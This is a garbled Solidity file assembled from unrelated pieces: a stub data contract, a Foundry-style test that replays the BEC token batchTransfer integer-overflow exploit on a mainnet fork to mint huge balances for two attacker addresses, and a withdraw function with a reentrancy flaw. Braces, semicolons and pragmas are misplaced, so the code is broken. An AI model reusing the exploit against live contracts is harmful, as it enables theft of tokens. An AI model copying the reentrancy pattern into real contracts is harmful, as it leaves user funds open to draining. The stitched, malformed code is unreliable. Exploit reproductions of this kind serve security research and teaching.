
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

;
;
interface BECToken {
  function balanceOf(address account) external view returns (uint256);
  function batchTransfer(address[] calldata _receivers, uint256 _value) external returns (bool)};
contract ContractTest is DSTest {
  address attacker1 = 0xb4D30Cac5124b46C2Df0CF3e3e1Be05f42119033;
  address attacker2 = 0x0e823fFE018727585EaF5Bc769Fa80472F76C3d7;
  BECToken bec = BECToken(0xC5d105E63711398af9bbff092d4B6769C82F793D);
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("mainnet", 5483642)};
  function testExploit() public {
    emit log_named_decimal_uint("Before Exploit, Attacker1 BEC Balance", bec.balanceOf(attacker1), 18);
    emit log_named_decimal_uint("Before Exploit, Attacker2 BEC Balance", bec.balanceOf(attacker2), 18);
    address [] memory receivers = new address[](2);
    receivers[0] = attacker1;
    receivers[1] = attacker2;
    bec.batchTransfer(receivers, type(uint256).max / 2 + 1);
    emit log_named_decimal_uint("After Exploit, Attacker1 BEC Balance", bec.balanceOf(attacker1), 18);
    emit log_named_decimal_uint("After Exploit, Attacker2 BEC Balance", bec.balanceOf(attacker2), 18)}
mapping(address => uint256) public balances;
function withdraw() public {
    if (balances[msg.sender] > 0) {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent);
        balances[msg.sender] = 0}